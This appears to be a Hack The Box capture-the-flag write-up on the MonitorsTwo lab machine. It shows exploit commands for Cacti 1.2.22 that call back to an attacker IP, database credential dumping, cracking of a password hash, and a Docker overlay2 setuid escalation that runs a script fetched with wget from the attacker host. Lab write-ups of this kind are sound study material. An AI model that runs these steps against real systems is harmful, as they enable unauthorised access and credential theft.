---
layout: post
title:  HTB - MonitorsTwo
subtitle: Pwning MonitorsTwo
date:   2023-07-13
tags: [writeup, cybersecurity, hackthebox]
author: Patrick Castro
comments: True
---

This is how I pwned MonitorsTwo.

<br>

## Initial Foothold

IP Address
```
10.10.11.211 - Machine IP
10.10.16.19 - Attacker IP
```

Open Ports
```
22
80
```

Nmap
```shell
Nmap scan report for 10.10.11.211
Host is up (0.075s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.23 seconds
```

Now accessing the port 80, and checking if the version of Cacti is vulnerable
```
Version 1.2.22 | (c) 2004-2023 - The Cacti Group
```

<br>

## Road to User

Cacti 1.2.22
- https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
- https://www.exploit-db.com/exploits/51166
- https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/
- https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit/blob/main/cacti.py

```shell
python3 cacti.py -u http://10.10.11.211/ --LHOST=10.10.16.19 --LPORT=9001

python3 cacti.py -u http://10.10.11.211/ -i 10.10.16.19 -p 9001
```

msfconsole
```shell
msf > use exploit/linux/http/cacti_unauthenticated_cmd_injection
```

<br>

### Further enumeration

```shell
www-data@50bca5e748b0:/var/www/html$ cat cacti.sql
[...]
INSERT INTO user_auth VALUES (1,'admin','21232f297a57a5a743894a0e4a801fc3',0,'Administrator','','on','on','on','on','on','on',2,1,1,1,1,'on',-1,-1,'-1','',0,0,0);
INSERT INTO user_auth VALUES (3,'guest','43e9a4ab75570f5b',0,'Guest Account','','on','on','on','on','on',3,1,1,1,1,1,'',-1,-1,'-1','',0,0,0);
[...]
```
> This was a rabbit hole after decypting the admin password. As it turns out that admin:admin is not working in http://10.10.11.211/.

Getting access to mysql database.
```shell
www-data@50bca5e748b0:/$ cat include/config.php
[...]
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
```

Connecting to Mysql database
```shell
www-data@50bca5e748b0:/$ mysql -h db -u root -p cacti

show tables;
show columns from settings_user;
show columns from user_auth;
```

Discovering another user `marcus`
```shell
SELECT * FROM user_auth;

exit
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfail	reset_perms
1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	2	1	1	1	1	on	-1	-1	-1		0	0	663348655
3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1		0	0	0
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb			on	on	on	on	1	1	1	1	1	on	-1	-1	on	0	0	2135691668



admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC - Jamie Thompson	admin@monitorstwo.htb
guest:43e9a4ab75570f5b - 
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C - Marcus Brune	marcus@monitorstwo.htb
```

Decrypting `marcus` password
```
https://hashes.com/en/decrypt/hash

$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hj # Unknown hash of admin
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

<br>

### User.txt

```shell
ssh marcus@monitorstwo.htb
funkymonkey

marcus@monitorstwo:~$ ls
user.txt
marcus@monitorstwo:~$ cat user.txt
[REDACTED-FLAG]
```

<br>

## Path to Power (Gaining Administrator Access)

### Enumeration as user `marcus`

```
marcus@monitorstwo:~$ sudo -l
[sudo] password for marcus: 
Sorry, user marcus may not run sudo on localhost.
```

Skipping other enumeration (`/etc/passwd`).

Monitoring the process running
```shell
marcus@monitorstwo:~$ ps aux

[...]
root        1234  0.0  0.2 1525408 10896 ?       Sl   08:01   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id e2378324fced58e8166b82ec842ae45961417b4195aade5113fd
root        1333  0.0  0.1 1223816 4144 ?        Sl   08:01   0:00 /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.19.0.3 -container-
root        1349  0.0  0.2 1451932 11288 ?       Sl   08:01   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a
[...]
```
> A docker container is running with the namespace of moby.

Logging to SSH again, I have missed out something here.
```shell
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

[...]


You have mail.
Last login: Thu Jul 13 08:01:54 2023 from 10.10.16.19
```
> You have mail message is something new to my eyes.

I checked the `/var/mail`. And it is indeed true that I as `marcus` have mail.
```shell
marcus@monitorstwo:~$ ls /var/mail
marcus

marcus@monitorstwo:~$ ls /var/mail/marcus
/var/mail/marcus

marcus@monitorstwo:~$ file /var/mail/marcus
/var/mail/marcus: news or mail, ASCII text, with very long lines
```

Checking the mail.
```shell
marcus@monitorstwo:~$ cat /var/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```
> There are CVEs cited in the email.

Checking those 3, these are Rabbit Holes
```
CVE-2021-33033
CVE-2020-25706
```

<br>

### Getting a shell

#### CVE-2021-41091
https://github.com/UncleJ4ck/CVE-2021-41091

But first it requires the docker container to be root and set the setuid bit on /bin/bash in the Docker container.

Setting the SetUID in `www-data` to gain Root
```shell
www-data@50bca5e748b0:/sbin$ capsh --uid=0 --gid=0 --
whoami
root

id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

chmod u+s /bin/bash
```

After setting the setuid, transfer the `exp.sh` to the machine. 
```shell
marcus@monitorstwo:/var/tmp$ wget http://10.10.16.19:9002/exp.sh
--2023-07-13 08:41:22--  http://10.10.16.19:9002/exp.sh
Connecting to 10.10.16.19:9002... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2447 (2.4K) [text/x-sh]
Saving to: ‘exp.sh’

exp.sh                                            100%[=============================================================================================================>]   2.39K  --.-KB/s    in 0.03s   

2023-07-13 08:41:22 (75.3 KB/s) - ‘exp.sh’ saved [2447/2447]

marcus@monitorstwo:/var/tmp$ chmod +x exp.sh
```

Running the exploit `exp.sh` will grant the root shell.
```shell
marcus@monitorstwo:/var/www/html$ ../../tmp/exp.sh
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell

marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ exit
marcus@monitorstwo:/var/www/html$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# 
```

<br>

### Root.txt

```
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p

bash-5.1# ls
bin  boot  dev	entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run	sbin  srv  sys	tmp  usr  var

bash-5.1# ls /root
cacti  root.txt

bash-5.1# cat /root/root.txt
[REDACTED-FLAG]
```

That's how I pwned MonitorsTwo.

<br>

### Achievement:
https://www.hackthebox.com/achievement/machine/743510/539